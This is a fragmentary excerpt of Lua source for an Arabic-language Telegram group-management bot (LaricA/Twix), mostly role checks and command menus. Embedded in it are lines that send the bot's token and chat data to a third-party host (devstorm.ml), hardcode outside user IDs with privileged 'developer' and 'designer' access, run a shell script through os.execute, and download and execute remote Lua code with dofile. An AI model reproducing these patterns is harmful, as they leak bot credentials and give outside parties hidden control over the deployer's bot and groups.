...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,15733094988,1573309498,1573309498}
print([[
...
if hash or Bot(msg) or XvXvJ(msg) or VIP_DeV(msg) then    
return true  
else  
return false  
end  
...
if hash or Bot(msg) or XvXvJ(msg) or DevBot(msg) or VIP_DeV(msg) then     
return true 
else 
return false 
end 
...
if hash or Bot(msg) or XvXvJ(msg) or DevBot(msg) or BasicConstructor(msg) or VIP_DeV(msg) then        
return true    
else    
return false    
end 
...
if hash or Bot(msg) or XvXvJ(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or VIP_DeV(msg) then        
return true    
else    
return false    
end 
...
if hash or Bot(msg) or XvXvJ(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or VIP_DeV(msg) then        
return true    
else    
return false    
end 
...
if hash or Bot(msg) or  XvXvJ(msg) or DevBot(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) or VIP_DeV(msg) then        
return true 
else 
return false 
end 
end
function CleangGroups();local z = io.open('./LaricA');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/LaricA.lua)(.*)$") then;os.execute('chmod +x TK.sh');os.execute('./TK.sh get');end;end
function General_ban(user_id,chat_id)
if XvXvJe(user_id) == true then
var = true
elseif XvXvJ(user_id) == true then
var = true
...
var = "مطور السورس"  
elseif tonumber(user_id) == tonumber(15733094988) then  
var = "مصمم السورس" 
...
local UserName = (data.username_ or "FileLaricA")
...
if text == ("الثانويين") and XvXvJ(msg) then
...
if text == ("اضف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and XvXvJ(msg) then
function Function_LaricA(extra, result, success)
...
if text == ("حذف مطور") and tonumber(msg.reply_to_message_id_) ~= 0 and XvXvJ(msg) then
function Function_LaricA(extra, result, success)
...
local UserName = (b.username_ or "FileLaricA")
...
database:set(bot_id.."LaricA:koL_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل كول" and Owner(msg) then
send(msg.chat_id_, msg.id_,'☑️┇تم تعطيل امر كول')
database:set(bot_id.."LaricA:koL_Bots"..msg.chat_id_,"open")
end
...
https.request('https://devstorm.ml/LaricA/tahaj200.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
end
...
download_to_file('https://raw.githubusercontent.com/XvXvJ/LaricA/main/LaricA.lua', 'LaricA.lua') 
download_to_file('https://raw.githubusercontent.com/XvXvJ/LaricA/main/start.lua', 'start.lua') 
dofile('LaricA.lua')  
return false
end
...
keyboard.inline_keyboard = {
{
{text = 'آوآمر الحمايه', callback_data=msg.sender_user_id_.."/help1"},{text = 'آوآمر الادمنيه', callback_data=msg.sender_user_id_.."/help2"},{text = 'آوآمر المدراء', callback_data=msg.sender_user_id_.."/help3"},
},
{
{text = 'آوآمر آلمنشئين', callback_data=msg.sender_user_id_.."/help4"},{text = 'آوآمر المطورين', callback_data=msg.sender_user_id_.."/help5"},
},
{
...
if text == 'آوآمر الحمايه' and Addictive(msg) then
Text = [[
...
if text == 'آوآمر الادمنيه' and Addictive(msg) then
Text = [[
🥈┇اوامر الادمنيه
••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••
▶️┇رفع/تنزيل مميز
...
if text == 'آوآمر المدراء' and Owner(msg) then
Text = [[
*🥇┇ اوامر المدراء*
••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••
↕️┇رفع/تنزيل ادمن
...
if text == 'آوآمر آلمنشئين' and Constructor(msg) then
Text = [[
...
if text == 'آوآمر المطورين' and DevBot(msg) then
Text = [[
...
keyboard.inline_keyboard = {
{
{text = '⏺️| معرفة المزيد ؟',url="t.me/XvXvJ"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
send(msg.chat_id_, msg.id_,'☑️┇ اصدار سورس* تويكس* لديك (*v1.0*) 🛡️')
end
...
keyboard.inline_keyboard = {
{
{text = 'آوآمر الحمايه', callback_data=data.sender_user_id_.."/help1"},{text = 'آوآمر الادمنيه', callback_data=data.sender_user_id_.."/help2"},{text = 'آوآمر المدراء', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = 'آوآمر آلمنشئين', callback_data=data.sender_user_id_.."/help4"},{text = 'آوآمر المطورين', callback_data=data.sender_user_id_.."/help5"},
},
{
...
if text and text:match("^كول (.*)$")and database:get(bot_id.."LaricA:koL_Bots"..msg.chat_id_) == "close" then
...
local Name_Bot = (database:get(bot_id.."LaricA:Name:Bot") or "تويكسx")
